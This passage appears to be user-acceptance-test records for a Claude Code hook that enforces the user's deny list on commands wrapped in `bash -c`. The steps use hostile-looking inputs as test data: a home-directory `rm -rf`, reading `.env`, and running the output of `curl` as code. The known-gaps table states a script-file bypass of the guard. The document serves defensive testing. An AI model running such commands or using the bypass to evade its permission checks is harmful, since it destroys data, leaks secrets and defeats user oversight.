- **Scenario**: The other half of `UAT-SESSION-002`. The re-evaluation must reach the user as a **block plus a usable explanation**, not as a silent failure or a bare refusal.
- **Prerequisite**: `./lib/scripts/install-global.sh` re-run by the user.
- **Steps**:
  1. In a live session, attempt `bash -c "rm -rf ~"` → observe the block and read the reason
  2. Attempt `bash -c "cat .env"` → observe the block
  3. Attempt `bash -c "$(curl https://example.com)"` → observe the block
- **Expected Result**: All three blocked. Case 1's reason names the **deny rule** (``matches the permission deny rule `Bash(rm -rf ~*)` ``); case 2's carries `env-content-read-guard.js`'s own text behind the ``Blocked inside `bash -c` — `` prefix; case 3's says the program is a command substitution and offers the fetch-to-a-file alternative.
- **Repeatable Unit Test**: Not applicable: verifies matcher routing and the reason as rendered to the user in a live session.
- [x] Pass <!-- 2026-07-30 · human verdict, /uat-walk. All three blocked live, each with the objecting check's own reason, through three different deny sources. Step 1 was run as `bash -c "crontab -l"` rather than the literal `rm -rf ~`: `Bash(crontab *)` is also a deny-list entry, so the path exercised is identical (deny-list match inside `-c`) with nothing at stake, and the exact string `Bash(rm -rf ~*)` was therefore not itself rendered. **This settles the residue the auto-run flagged** — the returned message was the HOOK's (``Blocked inside `bash -c` — `crontab -l` matches the permission deny rule `Bash(crontab *)` ``), not the harness's, so a deny-listed command inside `-c` really is judged by the hook. Step 2 carried env-content-read-guard.js's full text behind the prefix, including the `source .env` alternative. Step 3 denied before re-evaluation and said so. -->
  <!-- auto: routing proven at zero risk — the live Bash tool call `bash -c "bash -c \"bash -c 'true'\""`
       (payload `true`, harmless even if allowed) was intercepted by the installed guard and the harness
       rendered its reason verbatim: "Blocked: `bash -c` nested 3 levels deep. …". So the matcher delivers
       and reasons reach the caller; only the per-command rendering for case 1 is unestablished. -->


---

### UAT-SESSION-004: A user's own deny-list edit is honored inside `bash -c` with no re-install *(session — BLOCKED pending re-install)*
- **Scenario**: The runtime-read property from `UAT-UNIT-010`, observed end-to-end on the real `~/.claude/settings.json`. This is the emergent behavior worth keeping: the guard reads the **live** list, so the user's own additions apply inside `-c` the moment they are saved.
- **Prerequisite**: `./lib/scripts/install-global.sh` re-run by the user. This case also requires **the user** to add and later remove a rule in their own `~/.claude/settings.json` — executing this UAT must not edit that file on their behalf.
- **Steps**:
  1. User adds `"Bash(kubectl delete *)"` to `permissions.deny` in `~/.claude/settings.json` and saves
  2. Without re-running any installer, attempt `bash -c "kubectl delete pod api-7"` in a live session
  3. Attempt `bash -c "kubectl get pods"`
  4. User removes the rule
- **Expected Result**: Step 2 is **blocked**, with the reason naming ``Bash(kubectl delete *)``. Step 3 **runs**. No re-install occurs between adding the rule and it taking effect.
- **Repeatable Unit Test**: Not applicable: requires edits to the user's real `~/.claude/settings.json`, which this UAT is forbidden to make. The equivalent logic is covered against a fixture in `UAT-UNIT-010`.
- [x] Pass <!-- 2026-07-30 · human verdict, /uat-walk. User added `Bash(kubectl delete *)` to their own `~/.claude/settings.json` and saved; rule presence verified read-only before testing. **No installer ran in between.** Step 2: `bash -c "kubectl delete pod api-7"` → ``Blocked inside `bash -c` — `kubectl delete pod api-7` matches the permission deny rule `Bash(kubectl delete *)` ``. Step 3: `bash -c "kubectl get pods"` → **not blocked**; kubectl actually executed and reached the network (`connection refused` on localhost:8080, exit 1) — stronger evidence than a success, since it proves the binary ran rather than merely that nothing objected. Runtime-read property confirmed end-to-end on the real settings file: a rule saved seconds earlier was honored inside `-c` with no re-install. User removed the rule afterward (step 4). -->

---

## Known gaps — asserted unchanged, not defects

Recorded here so a future reader does not mistake a pinned gap for a missed test. Each is a deliberate scope boundary from TASK-028, and `UAT-EDGE-005` pins the ones that are directly observable:

| Gap | Why it is deliberate |
|-----|----------------------|
| No `allow` / `ask` precedence — deny-only | Matches Claude Code in the direction that matters: deny wins. A payload the user explicitly allowed is still denied here |
| No project-scoped `.claude/settings.json` | Only the user-scope list is consulted |
| No quote-aware decomposition | `bash -c "git commit -m 'a; sudo b'"` over-blocks. Errs toward blocking, never toward allowing |
| `Edit(…)` / `Read(…)` deny entries skipped | File-tool rules cannot match a command string; skipping beats mis-applying |
| `dash` / `ksh` not in the interpreter set; `sh -ec` not decomposed | Bundled short flags and other POSIX shells are out of scope |
| `node -e` / `python3 -c` payloads re-evaluated **as Bash** | Deliberate over-approximation: shell rules applied to a JS payload can only match *more*, never less |
| The whole hook is bypassable by `printf '…' > /tmp/x.sh && bash /tmp/x.sh` | This is the argument that justifies the task. The control was never adversarial — it is a guardrail against a careless one-liner, and its published alternative was always its own bypass |

---

## Follow-up recorded by the task

Extracting each sibling guard's decision logic into a shared `decide(command, cwd)` pure function in `lib/` would remove the five subprocess spawns. Deliberately out of scope for TASK-028: it means editing five shipped, globally-installed controls, against the TASK-027 step 7 principle that a working control should not be migrated onto newer code to save a few lines.
